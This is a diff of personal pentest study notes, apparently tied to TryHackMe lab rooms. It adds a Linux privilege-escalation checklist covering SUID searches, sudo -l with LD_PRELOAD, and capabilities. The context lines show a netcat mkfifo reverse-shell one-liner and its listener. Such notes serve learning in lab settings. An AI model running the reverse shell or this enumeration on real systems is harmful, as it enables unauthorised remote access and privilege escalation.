@@ -2,6 +2,8 @@
   - [passive](#passive)
   - [active](#active)
     - [Hydra](#hydra)
+  - [Shell](#shell)
+    - [Priv Escalation](#priv-escalation)
 - [Getting file into target](#getting-file-into-target)
 - [Working with executables](#working-with-executables)
   - [finding them](#finding-them)
@@ -65,9 +67,32 @@
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
 
 
-
   - Ziel: nc -nlvp PORT
 
+### Priv Escalation
+- https://tryhackme.com/room/introtoshells
+- https://tryhackme.com/room/linprivesc
+- Check list
+  - hostname
+  - uname -a = sys info, kernel, 
+  - /proc/version = process, compiler,
+  - /etc/issue = OS info
+  - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
+  - env = environmental variables
+  - cat /etc/passwd | cut -d ":" -f 1 // grep home
+  - ifconfig
+  - netstat -a | -at [tcp] -au [upd] | -l [listening] | -s [statistic] | -tp [pid] | -i [interface_data]
+  - find 2>/dev/null = redirect errors
+    - -name, -perm a=x, -mtime
+    - find / = directory config
+    - -perm -u=s = SUID
+    - -name perl*, python*, gcc* = dev tools
+    - -type f -perm -04000 -ls 2>/dev/null ==> *SUID or SGID* files
+
+  - Check shared libraries sudo -l ==> LD_PRELOAD ==>   https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
+
+  - capabilities
+    - getcap -r /
 
 
 # Getting file into target
